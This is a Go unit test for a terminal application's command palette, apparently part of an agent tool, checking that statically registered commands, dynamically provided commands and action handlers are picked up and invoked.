// extension points (static + dynamic providers + action handlers).
func TestModel_PaletteRegistrationAPI(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "sonnet", "/w", "u", "h")
	m.width = 80
	m.height = 30

	// Static registration
	m.RegisterPaletteCommands([]commandpalette.Command{
		{
			Name:        "my-static",
			Description: "A static extension",
			Category:    "Custom",
			RiskLevel:   "caution",
		},
	})

	// Dynamic provider
	m.RegisterPaletteProvider(func() []commandpalette.Command {
		return []commandpalette.Command{
			{Name: "dynamic-1", Description: "From provider"},
		}
	})

	// Action handler registration
	called := false
	m.RegisterPaletteActionHandler("my-action", func(key string) tea.Cmd {
		called = true
		return nil
	})

	// Open the palette
	_, _ = m.Update(tea.KeyMsg{Type: tea.KeyCtrlK})

	if m.commandPaletteModel == nil {
		t.Fatal("expected palette to be open")
	}

	// Verify that building the command list includes our additions.
	cmds := m.buildCommandPaletteCommands()
	foundStatic := false
	foundDynamic := false
	for _, c := range cmds {
		if c.Name == "my-static" {
			foundStatic = true
		}
		if c.Name == "dynamic-1" {
			foundDynamic = true
		}
	}
	if !foundStatic {
		t.Error("static registered command not present in palette")
	}
	if !foundDynamic {
		t.Error("dynamic provider command not present in palette")
	}

	// Simulate selecting a registered action (exercises the handler path)
	_, cmd := m.Update(commandpalette.SelectedMsg{
		Name:      "my-action",
		ActionKey: "my-action",
	})

	if !called {
		t.Error("registered action handler was not invoked")
	}
	_ = cmd
}
